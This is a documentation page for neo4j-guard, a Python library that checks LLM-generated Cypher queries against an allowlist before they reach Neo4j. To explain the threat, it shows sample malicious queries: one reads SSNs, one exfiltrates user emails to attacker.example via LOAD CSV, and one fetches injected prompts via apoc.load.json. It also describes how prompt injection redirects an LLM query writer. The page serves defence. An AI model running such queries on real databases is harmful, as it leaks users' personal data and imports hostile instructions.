---
title: What is neo4j-guard?
description: neo4j-guard by Zices is a Python library that blocks unsafe Cypher queries before they reach Neo4j. Read-only by default.
sidebar_position: 1
---

`neo4j-guard` by [Zices](https://github.com/iamzices) is a Python library that blocks unsafe Cypher queries before execution. It parses Cypher using ANTLR and Neo4j's Cypher 25 grammar, then traverses the resulting syntax tree to validate query operations against built-in safety rules. A query or result that is not allowed raises `GuardError`. By default, only read queries are allowed.

```python
from neo4j import GraphDatabase
from neo4j_guard import GuardError, guard

driver = guard(GraphDatabase.driver(URL, auth=AUTH))

try:
    driver.execute_query("CREATE (:Person {name: 'Ada'})")
except GuardError as error:
    print(error)  # CREATE is not allowed in read mode
```

It works with the Neo4j driver (5.8+), LangChain's `Neo4jGraph`, and the Neo4j MCP server. It is compatible with Neo4j Community Edition, Enterprise Edition, and Aura.

## Why neo4j-guard?

`neo4j-guard` is designed as an agent guardrail. LLM-generated Cypher is untrusted input. An LLM writes Cypher from the text it is given: user messages, retrieved documents, and data from the graph itself. Any of that text can carry instructions, so anyone who can put text in front of the LLM can change the query it writes. The query then runs with the permissions of the database connection.

Read-only does not stop malicious queries. The usual defense is to make the connection read-only, but this is not available to Community Edition users. Either way, read-only only blocks writes, but a query does not need to write to do damage. Each of these malicious queries can run with read-only permissions:

```cypher
// Reads a property the LLM should not see
MATCH (p:Person) RETURN p.name, p.ssn

// Sends every user's email to another server
MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row RETURN row

// Fetches new instructions for the LLM from another server
CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
```

Therefore, it is important to check every query before it runs. `neo4j-guard` fully parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every query against an allowlist before Neo4j sees it. It takes one call on the driver, with no server changes, and it works on Community Edition, Enterprise Edition, and Aura:

```python
from neo4j import GraphDatabase
from neo4j_guard import guard

driver = guard(
    GraphDatabase.driver(URL, auth=AUTH),
    mode="read", # default configuration blocks most malicious queries
    disallow=["Person.ssn"],
)
```

A blocked query raises `GuardError`, and the message says what was blocked, so the LLM can rewrite the query. To install it and guard a driver, follow the [Quick start](./quick-start.md).

## How it works

`neo4j-guard` parses each query into a syntax tree with Neo4j's own Cypher 25 grammar and checks every clause, procedure, function, label, and property in it, including those in subqueries.

Every node of the tree is checked, not only the top-level clauses. A clause in a `CALL { }` subquery, a function in a `WHERE` condition, and a property in a map literal are all checked. Each node is checked by its kind:

| Kind                       | Default                             |
| -------------------------- | ----------------------------------- |
| Clause                     | Read clauses only                   |
| Function                   | Allowed only selected essentials    |
| Procedure                  | Allowed only selected essentials    |
| Label or relationship type | Allowed                             |
| Property                   | Allowed                             |
| Admin command              | Blocked                             |

Clauses, procedures, and functions are checked against an allowlist. `allow` adds to it and `disallow` removes from it. Labels, relationship types, and properties are allowed by default. Most procedures and functions are disallowed by default. After each query runs, each record is also checked for labels and properties in `disallow` before the driver returns it.

This is how neo4j-guard parses this example query and blocks it:

```cypher
MATCH (u:User)
LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row
RETURN row
```

| Node                                 | Kind     | Result      |
| ------------------------------------ | -------- | ----------- |
| `MATCH`                              | Clause   | Allowed     |
| `User`                               | Label    | Allowed     |
| `LOAD CSV`                           | Clause   | **Blocked** |
| `'https://attacker.example/?email='` | Literal  | Not checked |
| `email`                              | Property | Allowed     |
| `RETURN`                             | Clause   | Allowed     |
